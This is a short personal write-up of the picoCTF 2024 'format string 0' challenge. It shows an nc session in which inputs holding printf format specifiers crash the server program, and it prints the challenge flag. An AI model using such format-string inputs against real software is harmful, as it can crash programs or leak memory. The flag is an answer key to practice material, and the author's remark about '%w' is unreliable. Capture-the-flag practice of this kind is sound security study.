- ## Challenge Info
	- **Name:** format string 0
	- **Category:** [[Binary Exploitation]] [[picoCTF 2024]]
	- Level: [[Easy]]
	- **Link:** https://play.picoctf.org/practice/challenge/433
	- **Description:**
		- Can you use your knowledge of format strings to make the customers happy?
		  id:: 680f1720-a135-4364-8a4f-4ae5521f38eb
		  Download the binary [here](https://artifacts.picoctf.net/c_mimas/69/format-string-0).
		  Download the source [here](https://artifacts.picoctf.net/c_mimas/69/format-string-0.c).
		  Connect with the challenge instance here:
		  `nc mimas.picoctf.net 50080`
- ## Problem Understanding
	- Without thinknig, i nc into the server
- ## Approach and Steps
- [Step 1]
  logseq.order-list-type:: number
	- nc into the server and trie to enter random input.
	- ```
	  Enter your recommendation: Breakf@st_Burger
	  Breakf@st_BurgerPatrick is still hungry!
	  Try to serve him something of larger size! 
	  ````
	-
- [Step 2]
  logseq.order-list-type:: number
	- I knew that the program was written in C and to store user input in variable we use `%s %w` etc.
	- So i tried The options with most number of `%` signs in the input.
- [Step 3]
  logseq.order-list-type:: number
	- ```
	  nc mimas.picoctf.net 50080
	  Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
	  Here comes the first customer Patrick who wants a giant bite.
	  Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
	  Enter your recommendation: Gr%114d_Cheese
	  Gr                                                                                                           4202954_Cheese
	  Good job! Patrick is happy! Now can you serve the second customer?
	  Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
	  Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
	  Enter your recommendation: Cla%sic_Che%s%steak
	  ClaCla%sic_Che%s%steakic_Che(null)
	  picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
	  ```
- ## Solution
	- The flag was: `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}`
- ## Tools Used
	- [[nc]]